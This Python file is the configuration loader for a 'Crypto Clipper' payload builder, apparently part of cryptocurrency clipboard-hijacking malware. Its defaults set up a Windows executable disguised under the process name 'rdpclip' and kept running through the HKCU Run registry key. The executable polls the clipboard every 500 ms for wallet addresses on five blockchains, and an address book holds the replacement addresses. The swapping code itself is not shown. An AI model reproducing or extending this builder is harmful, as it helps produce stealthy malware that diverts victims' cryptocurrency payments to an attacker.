# -*- coding: utf-8 -*-
"""
Configuration loader for Crypto Clipper — JSON config + defaults.
Builder-style configuration for clipboard monitoring payload generation.
"""
import json
import os

CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")

_DEFAULTS = {
    "build": {
        "target_os": "windows",
        "target_arch": "x64",
        "output_name": "clip_monitor.exe",
        "custom_icon": "",
        "process_name": "rdpclip",
        "startup_method": "registry",
        "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    },
    "chains": {
        "bitcoin": {
            "enabled": True,
            "prefix": ["1", "3", "bc1"],
        },
        "ethereum": {
            "enabled": True,
            "prefix": ["0x"],
        },
        "solana": {
            "enabled": True,
            "prefix": [],
        },
        "tron": {
            "enabled": True,
            "prefix": ["T"],
        },
        "litecoin": {
            "enabled": False,
            "prefix": ["L", "M", "ltc1"],
        },
    },
    "address_book": [],
    "detection": {
        "sensitivity": "high",
        "min_address_length": 26,
        "max_address_length": 62,
        "exclusion_patterns": [],
        "clipboard_watch_interval_ms": 500,
    },
}


def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            user_cfg = json.load(f)
        merged = {**_DEFAULTS, **user_cfg}
        return merged
    return _DEFAULTS.copy()


def save_config(cfg):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=4, ensure_ascii=False)


def get_config_value(key, default=None):
    cfg = load_config()
    keys = key.split(".")
    val = cfg
    for k in keys:
        if isinstance(val, dict) and k in val:
            val = val[k]
        else:
            return default
    return val
